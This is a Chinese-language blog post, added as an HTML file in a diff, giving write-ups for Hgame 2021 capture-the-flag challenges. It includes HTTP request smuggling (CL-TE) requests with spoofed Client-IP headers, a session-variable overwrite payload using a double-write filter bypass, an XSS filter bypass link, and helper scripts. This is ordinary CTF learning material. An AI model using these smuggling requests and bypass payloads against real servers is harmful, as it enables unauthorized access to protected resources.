@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hgame题解 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WEB1 Hitchhiking_in_the_Galaxy 点击“我要搭顺风车”同时看network 发现搭顺风车发现302重定向，用burpsuite把&#x2F;HitchhikerGuide.php给Repeater，显示405，知道是请求方式不对 改成post后告诉要用Infinite Improbability Drive访问，改为User-Agent 然后要从cardinal过来，把https">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame题解">
+<meta property="og:url" content="http://example.com/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEB1 Hitchhiking_in_the_Galaxy 点击“我要搭顺风车”同时看network 发现搭顺风车发现302重定向，用burpsuite把&#x2F;HitchhikerGuide.php给Repeater，显示405，知道是请求方式不对 改成post后告诉要用Infinite Improbability Drive访问，改为User-Agent 然后要从cardinal过来，把https">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-01-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-02-13T20:02:11.633Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Hgame题解" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/" class="article-date">
+  <time datetime="2021-01-29T16:00:00.000Z" itemprop="datePublished">2021-01-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Hgame题解
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>WEB1</p>
+<p>Hitchhiking_in_the_Galaxy</p>
+<p>点击“我要搭顺风车”同时看network</p>
+<p>发现搭顺风车发现302重定向，用burpsuite把/HitchhikerGuide.php给Repeater，显示405，知道是请求方式不对</p>
+<p>改成post后告诉要用Infinite Improbability Drive访问，改为User-Agent</p>
+<p>然后要从cardinal过来，把<a target="_blank" rel="noopener" href="https://cardinal.ink/%E6%94%B9%E4%B8%BAReferer">https://cardinal.ink/改为Referer</a></p>
+<p>最后要求本地访问，用XFF伪造一下最后得到flag</p>
+<p>WEB2 watermelon</p>
+<p>F12看源代码（最后用的microsoft自带的浏览器看的，我不知道为什么火狐看不了QAQ）。。。找找游戏结束或者游戏过程中分数判定的代码</p>
+<p>在核心代码project.js的第2087行看到了一个函数gameOverShowText</p>
+<p>里面有一个if语句条件是e&gt;1999，结合题目说分数到2000就有flag，enmm不用多说了吧</p>
+<p>看到window.atob直接把后面那个字符串解密就得到flag了</p>
+<p>WEB3 宝藏走私者</p>
+<p>响应头看到了ATS/7.1.2</p>
+<p>用CL-TE构造请求</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: thief.0727.site</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;thief.0727.site&#x2F;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 49</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<p>WEB4 智商检测鸡</p>
+<p>首先看到题目是json动态生成的</p>
+<p>随便自己做几个题，点击提交，大概过程是这样的</p>
+<p>一开始有一个Cookie和一个对应的问题–&gt;解题得到答案后提交–&gt;得到一个全新的Cookie和一个全新的问题</p>
+<p>再观察network，就差不多明白原理是怎么样的了</p>
+<p>网站会给一个初始Cookie和问题</p>
+<p>提交答案，会将当前Cookie和answer以post的方式递交给/api/verify–&gt;答案正确，会以SetCookie的形式得到一个新的Cookie，用新的Cookie去访问/api/getQuestion得到新的算式，写代码计算结果–&gt;回到第一步，循环</p>
+<p>所以实际上，我们只需要得到最后一步的Cookie就完事了</p>
+<p>写了个脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">Cookie&#x3D;&#39;eyJzb2x2aW5nIjozOH0.YBWh9w.i8Tx0LiCRwZ6XDd62bKgdgzCxrI&#39;</span><br><span class="line">answer&#x3D;&#39;-17907.5&#39;</span><br><span class="line">while True:</span><br><span class="line">    #提交一个Cookie和对应的答案</span><br><span class="line">    headers&#x3D;&#123;&#39;Cookie&#39;:Cookie,&#39;Referer&#39;:&#39;http:&#x2F;&#x2F;r4u.top:5000&#39;&#125;</span><br><span class="line">    json&#x3D;&#123;&#39;answer&#39;:answer&#125;</span><br><span class="line">    url&#x3D;&#39;http:&#x2F;&#x2F;r4u.top:5000&#x2F;api&#x2F;verify&#39;</span><br><span class="line">    req&#x3D;requests.post(url&#x3D;url,headers&#x3D;headers,json&#x3D;json)</span><br><span class="line">    req.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line">    #再更新新的Cookie</span><br><span class="line">    patt&#x3D;&#39;session&#x3D;\w+\.\w+\.[^;]+&#39;    </span><br><span class="line">    res&#x3D;re.findall(patt,str(req.headers))</span><br><span class="line">    Cookie&#x3D;res[0]</span><br><span class="line">    #用最后输出的Cookie可以拿到flag，也可以用for准确拿到第100个的</span><br><span class="line">    print(Cookie+&#39;,&#39;+str(answer))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    #用新的Cookie再去获得新的算式</span><br><span class="line">    headers1&#x3D;&#123;&#39;Cookie&#39;:Cookie,&#39;Referer&#39;:&#39;http:&#x2F;&#x2F;r4u.top:5000&#39;&#125;</span><br><span class="line">    url1&#x3D;&#39;http:&#x2F;&#x2F;r4u.top:5000&#x2F;api&#x2F;getQuestion&#39;</span><br><span class="line">    req1&#x3D;requests.get(url&#x3D;url1,headers&#x3D;headers1)</span><br><span class="line">    req1.encoding&#x3D;&#39;utf-8&#39;</span><br><span class="line">    res1&#x3D;req1.text</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    #获得对应参数</span><br><span class="line">    patt1&#x3D;&#39;([0-9]+|-)&#39;</span><br><span class="line">    all_num&#x3D;re.findall(patt1,res1)#得到的all_num[0]是积分号的一部分，要从all_num[1]算起</span><br><span class="line">    #a是下限，b是上限，c是x系数，d是常数项</span><br><span class="line">    i&#x3D;1</span><br><span class="line">    if(all_num[i]!&#x3D;&#39;-&#39;):</span><br><span class="line">        a&#x3D;int(all_num[i])</span><br><span class="line">    else:</span><br><span class="line">        a&#x3D;0-int(all_num[i+1])</span><br><span class="line">        i&#x3D;i+1</span><br><span class="line">    i&#x3D;i+1</span><br><span class="line">    </span><br><span class="line">    if(all_num[i]!&#x3D;&#39;-&#39;):</span><br><span class="line">        b&#x3D;int(all_num[i])</span><br><span class="line">    else:</span><br><span class="line">        b&#x3D;0-int(all_num[i+1])</span><br><span class="line">        i&#x3D;i+1</span><br><span class="line">    i&#x3D;i+1</span><br><span class="line">    if(all_num[i]!&#x3D;&#39;-&#39;):</span><br><span class="line">        c&#x3D;int(all_num[i])</span><br><span class="line">    else:</span><br><span class="line">        c&#x3D;0-int(all_num[i+1])</span><br><span class="line">        i&#x3D;i+1</span><br><span class="line">    i&#x3D;i+1</span><br><span class="line">    if(all_num[i]!&#x3D;&#39;-&#39;):</span><br><span class="line">        d&#x3D;int(all_num[i])</span><br><span class="line">    else:</span><br><span class="line">        d&#x3D;0-int(all_num[i+1])</span><br><span class="line">    answer&#x3D;b*b*c&#x2F;2+b*d-a*a*c&#x2F;2-a*d</span><br></pre></td></tr></table></figure>
+
+<p>跑到最后拿到一个Cookie:session=eyJzb2x2aW5nIjoxMDB9.YBWixA.cDPpJxmg-267NEFllZIk2EHfu-M，改一下就得到flag</p>
+<p>WEB5走私者的愤怒</p>
+<p>这个题是WEB3升级版。差别在哪呢？如果我们没在请求头里添加Client-IP的话，发现他并不会提示我们没有添加Client-IP，而是告诉我们IP地址非本地。感觉这可能是因为他会在报文后自动添加Client-IP: IP，覆盖掉我们自己伪造的Client-IP，因此用WEB3的思路，只需要把他自己加的Client-IP给修成报文，那么我们第二次访问时就没有问题了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 100</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET &#x2F;secret HTTP&#x2F;1.1</span><br><span class="line">Host: police.liki.link</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">Content-Length: 200</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>WEB6LazyDogR4U</p>
+<p>御剑扫一下，访问<a target="_blank" rel="noopener" href="http://www.zip下载一下/">www.zip下载一下</a></p>
+<p>看flag文件和lazy文件</p>
+<p>flag文件得知，只要_SESSION[username]=admin就得到flag了，试了一下发现sql行不通</p>
+<p>再看lazy，发现可以通过post或者get篡改变量</p>
+<p>str_replace可以直接通过双写绕过</p>
+<p>那么构造payload：<a target="_blank" rel="noopener" href="http://1dc44fc80c.lazy.r4u.top/?_SESSSESSIONION%5Busername%5D=admin">http://1dc44fc80c.lazy.r4u.top?_SESSSESSIONION[username]=admin</a></p>
+<p>得到flag</p>
+<p>WEB7Post to zuckonit</p>
+<p>script被过滤，&lt;s被过滤（导致这里不能双写绕过），java被过滤</p>
+<p>考虑构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;somewhere.com&quot;&gt;Clickme&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现http变为空了，这里双写过滤成功</p>
+<p>最终payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;htthttpp:&#x2F;&#x2F;somewhere.com&quot;&gt;Clickme&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>破解md5脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;671b0e&#39;</span><br><span class="line">candidate &#x3D; 0</span><br><span class="line">while True:</span><br><span class="line">    plaintext &#x3D; str(candidate)</span><br><span class="line">    hash &#x3D; hashlib.md5(plaintext.encode(&#39;ascii&#39;)).hexdigest()</span><br><span class="line">    if hash[:6] &#x3D;&#x3D; target:</span><br><span class="line">        print(&#39;plaintext:&quot;&#39; + plaintext + &#39;&quot;, md5:&#39; + hash)</span><br><span class="line">        break</span><br><span class="line">    candidate &#x3D; candidate + 1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>WEB9Liki的生日礼物</p>
+<p>理论上只差两张兑换券，数量比较少</p>
+<p>因此感觉不是整数溢出，可以考虑用条件竞争</p>
+<p>用burpsuite可以脏到flag</p>
+<p>MISC1 Base全家福</p>
+<p>base64，base32，base16依次根据特征解码就得到flag了</p>
+<p>Crypt1缝合怪</p>
+<p>摩斯密码解密</p>
+<p><code>86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61</code></p>
+<p>再ascii解一下得到</p>
+<p><code>Vigenere-Liki:&#125;VkmvJb!1XtAxe!hpM1&#123;M+9xqzrTM_Nj~cRg4x</code></p>
+<p>维吉尼亚密码解密，密码是Liki，得到</p>
+<p><code>&#125;KccnYt!1NlPpu!zeE1&#123;C+9pfrhLB_Fz~uGy4n</code></p>
+<p>栅栏6时得到一串字符串</p>
+<p><code>&#125;!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp&#123;rzntu</code></p>
+<p>感觉貌似是倒序了，倒过来再凯撒13得到flag</p>
+<p>Crypto3 Transformer</p>
+<p>quipquip永远滴神</p>
+<p>有几个不确定的可以直接猜，就是我一开始以为是结尾加”year”，结果最后改成2021就过了/吐血</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/" data-id="ckm4piboy0002xov084ppbcpr" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/03/11/%E6%88%91%EF%BC%8C%E5%86%85%E5%8D%B7%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%80%85/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          我，内卷的失败者
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/12/23/bugku-web37%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%81%9A%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">bugku-web37的时间盲注做法</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/11/%E6%88%91%EF%BC%8C%E5%86%85%E5%8D%B7%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%80%85/">我，内卷的失败者</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/">Hgame题解</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/23/bugku-web37%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%81%9A%E6%B3%95/">bugku-web37的时间盲注做法</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/">异或注入中字符串的异或-sql的弱类型</a>
+          </li>
+        
+          <li>
+            <a href="/2020/12/05/C1CTF2020-WP/">C1CTF2020-题解</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
